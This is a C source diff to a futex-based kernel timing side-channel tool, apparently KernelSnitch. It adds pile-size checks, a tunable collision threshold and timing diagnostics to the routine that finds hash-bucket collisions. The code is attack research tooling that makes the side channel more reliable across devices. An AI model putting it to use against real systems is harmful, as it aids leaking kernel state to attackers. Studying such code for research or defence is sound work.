@@ -91,6 +91,13 @@ struct kernelsnitch_shared_state {
     pthread_t *increase_tids;
     size_t increase_count;
     size_t increase_id;
+    /*
+     * How many of the requested pile-up waiters really reached futex_wait().  This is not bookkeeping
+     * for its own sake: the whole timing oracle is "how long does a walk of the piled-up hash bucket
+     * take", so a pile that silently came up short turns the oracle into noise while looking healthy.
+     * It is shared state, so the parent can read what the forked collision child achieved.
+     */
+    size_t increase_created;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
     size_t identity_start;
     size_t identity_end;
@@ -146,16 +153,35 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
 {
     ks->increase_tids = calloc(amount, sizeof(*ks->increase_tids));
     ASSERT_pr((ks->increase_tids != NULL), "failed to allocate futex waiter ids\n");
-    ks->increase_count = amount;
+    ks->increase_count = 0;
     ks->increase_id = id;
+    ks->increase_created = 0;
+    int first_error = 0;
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
         inc_arg->id = id;
         inc_arg->ks = ks;
-        SYSCHK(pthread_create(&ks->increase_tids[i], 0, __do_increase,
-                              (void *)inc_arg));
+        /*
+         * pthread_create() reports failure by returning the error number, and it never returns -1, so
+         * SYSCHK() would silently accept a short pile.  Index by the number actually created so the
+         * join loop below only touches initialised slots, and keep the first error for the report.
+         */
+        int created = pthread_create(
+            &ks->increase_tids[ks->increase_created], 0, __do_increase,
+            (void *)inc_arg);
+        if (created != 0) {
+            if (!first_error)
+                first_error = created;
+            free(inc_arg);
+            continue;
+        }
+        ks->increase_created++;
     }
+    ks->increase_count = ks->increase_created;
     WAIT();
+    if (ks->increase_created != amount)
+        pr_warning("ksnitch pile short requested=%zu created=%zu errno=%d\n",
+                   amount, ks->increase_created, first_error);
 }
 
 static void __decrease(struct kernelsnitch_shared_state *ks)
@@ -164,11 +190,12 @@ static void __decrease(struct kernelsnitch_shared_state *ks)
         return;
     SYSCHK(__futex((unsigned int *)&ks->inc_futex[ks->increase_id],
                    FUTEX_WAKE_PRIVATE, INT_MAX, NULL, NULL, 0));
-    for (size_t i = 0; i < ks->increase_count; ++i)
+    for (size_t i = 0; i < ks->increase_created; ++i)
         SYSCHK(pthread_join(ks->increase_tids[i], NULL));
     free(ks->increase_tids);
     ks->increase_tids = NULL;
     ks->increase_count = 0;
+    ks->increase_created = 0;
 }
 
 /**
@@ -403,6 +430,40 @@ void kernelsnitch_set_search_bounds(
 }
 #endif
 
+#ifndef KERNELSNITCH_THRESHOLD_MULT
+#define KERNELSNITCH_THRESHOLD_MULT 10
+#endif
+#ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
+#endif
+
+/*
+ * The collision threshold is baseline * multiplier, and the multiplier is the one number that cannot be
+ * carried between devices: the baseline is a full futex round trip (scheduling, spectre mitigations,
+ * CPU frequency) while the signal is a fixed amount of work walking the piled-up bucket.  A device
+ * whose floor is twice as high therefore halves the ratio, and a multiplier that sat inside the signal
+ * on the origin device lands above it here.  Rather than freeze a second device's answer into a header,
+ * this reads an override so the multiplier can be swept on one boot; a malformed or out-of-range value
+ * is refused and the compiled default kept, because silently accepting it would change which probes
+ * count as collisions and that decision has consequences downstream.
+ */
+static size_t __ksnitch_threshold_mult(void)
+{
+    size_t mult = KERNELSNITCH_THRESHOLD_MULT;
+    const char *text = getenv("KSNITCH_THRESHOLD_MULT");
+    if (!text || !*text)
+        return mult;
+    char *end = NULL;
+    errno = 0;
+    unsigned long value = strtoul(text, &end, 0);
+    if (errno || !end || *end || value < 2 || value > 100) {
+        pr_warning("KSNITCH_THRESHOLD_MULT=%s refused, keeping %zu\n",
+                   text, mult);
+        return mult;
+    }
+    return (size_t)value;
+}
+
 /**
  * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
  * @arg ks: shared KernelSnitch state
@@ -410,13 +471,8 @@ void kernelsnitch_set_search_bounds(
 void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 {
     #define ID 128
-#ifndef KERNELSNITCH_THRESHOLD_MULT
-#define KERNELSNITCH_THRESHOLD_MULT 10
-#endif
-#ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
-#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
-#endif
     size_t count = 0;
+    size_t crossed = 0;
     size_t wanted;
     size_t futex_addr;
     size_t id;
@@ -442,10 +498,43 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     qsort(approx_samples, KERNELSNITCH_BASELINE_SAMPLES,
           sizeof(approx_samples[0]), __compare);
     size_t approx_time = approx_samples[KERNELSNITCH_BASELINE_QUANTILE];
+    unsigned long threshold = approx_time * (unsigned long)__ksnitch_threshold_mult();
+    /*
+     * The first few probes that cleared the threshold, remembered so the failure path can re-measure
+     * them with the pile drained.  Their times collapsing back to the floor is what proves they were
+     * looking at the piled-up bucket and not at an unrelated busy one - which decides whether the fix
+     * is the multiplier or the pile.
+     */
+    size_t slow_index[8];
+    size_t slow_count = 0;
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
     __increase(ks, ID, ks->appended_futexes);
+    /*
+     * Diagnostic: ask the kernel how many waiters really sit in the piled-up bucket, then what one
+     * full traversal of that bucket costs.  A wake with INT_MAX on the pile address returns exactly
+     * the number of matching sleepers, which answers "did the pile land" directly, and the cycle
+     * count of the same call is the price a colliding probe should be paying.  Together they tell a
+     * short pile apart from a walk that is merely cheaper than the threshold assumes - two very
+     * different fixes.  Draining is harmless, the pile is rebuilt immediately, and the whole block is
+     * off unless asked for so a normal run creates the waiters exactly once.
+     */
+    if (getenv("KSNITCH_TIMING_DIAG")) {
+        sched_yield();
+        size_t pile_t0 = rdtsc_begin();
+        int woke = __futex((unsigned int *)&ks->inc_futex[ID],
+                           FUTEX_WAKE_PRIVATE, INT_MAX, NULL, NULL, 0);
+        size_t pile_cycles = rdtsc_end() - pile_t0;
+        pr_warning("ksnitch pile requested=%zu created=%zu woke=%d "
+                   "wake_all=%zu per_entry=%zu\n",
+                   ks->appended_futexes, ks->increase_created, woke,
+                   pile_cycles,
+                   ks->increase_created ? pile_cycles / ks->increase_created
+                                        : 0);
+        __decrease(ks);
+        __increase(ks, ID, ks->appended_futexes);
+    }
     if (ks->verbose) pr_info("start finding collisisons\n");
 
     // find futex user space address which collide with the piled-up hash bucket ID 128
@@ -457,13 +546,15 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             break;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(ks, futex_addr);
-        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+        if (ks->times[i] > threshold) {
             int confirmed = 1;
+            crossed++;
+            if (slow_count < sizeof(slow_index) / sizeof(slow_index[0]))
+                slow_index[slow_count++] = i;
             for (size_t confirmation = 1;
                  confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
                  ++confirmation) {
-                if (__measure(ks, futex_addr) <=
-                    (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+                if (__measure(ks, futex_addr) <= threshold) {
                     confirmed = 0;
                     break;
                 }
@@ -482,19 +573,52 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         pr_warning("only found %zd collisions -> cannot continue\n", count);
         if (getenv("KSNITCH_TIMING_DIAG")) {
             size_t min_t = (size_t)-1, max_t = 0, sum_t = 0, n_t = 0;
+            size_t over2 = 0, over5 = 0, over10 = 0;
             for (size_t i = 2; i < ks->total_futexes; ++i) {
                 id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
                 if (id >= FUTEX_SZ) break;
                 if (ks->times[i] == 0) continue;
                 if (ks->times[i] < min_t) min_t = ks->times[i];
                 if (ks->times[i] > max_t) max_t = ks->times[i];
+                if (ks->times[i] > approx_time * 2) over2++;
+                if (ks->times[i] > approx_time * 5) over5++;
+                if (ks->times[i] > approx_time * 10) over10++;
                 sum_t += ks->times[i];
                 n_t++;
             }
             pr_warning("ksnitch timing diag approx_time=%zu threshold=%zu "
                        "min=%zu max=%zu mean=%zu n=%zu\n",
-                       approx_time, approx_time * KERNELSNITCH_THRESHOLD_MULT,
+                       approx_time, threshold,
                        min_t, max_t, n_t ? sum_t / n_t : 0, n_t);
+            /*
+             * `crossed` is how many probes were slow on their first look and `confirmed` how many
+             * survived the repeat gate.  A wide gap means the signal is real but unstable at this
+             * threshold; crossed close to zero means no probe ever met the pile at all, which points
+             * at the pile, not at the gate.
+             */
+            pr_warning("ksnitch timing hist over2=%zu over5=%zu over10=%zu "
+                       "crossed=%zu confirmed=%zu wanted=%zu\n",
+                       over2, over5, over10, crossed, count, wanted);
+            /*
+             * Empty the piled-up bucket and look at the slow probes again.  The pile is what makes a
+             * colliding probe slow, so if these were collisions their times must fall back to the
+             * floor; if they stay high they were busy with something else and the bucket was never
+             * reached.  Nothing downstream reads the pile after this point, so draining it here is
+             * safe, and `__decrease` below then finds nothing left to do.
+             */
+            if (slow_count) {
+                __decrease(ks);
+                for (size_t k = 0; k < slow_count; ++k) {
+                    size_t probe = slow_index[k];
+                    size_t probe_id =
+                        (probe * KS_PAGE_SIZE) | (probe * 8 % KS_PAGE_SIZE);
+                    if (probe_id >= FUTEX_SZ)
+                        continue;
+                    pr_warning("ksnitch timing empty i=%zu piled=%zu empty=%zu\n",
+                               probe, ks->times[probe],
+                               __measure(ks, (size_t)&ks->futexes[probe_id]));
+                }
+            }
         }
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
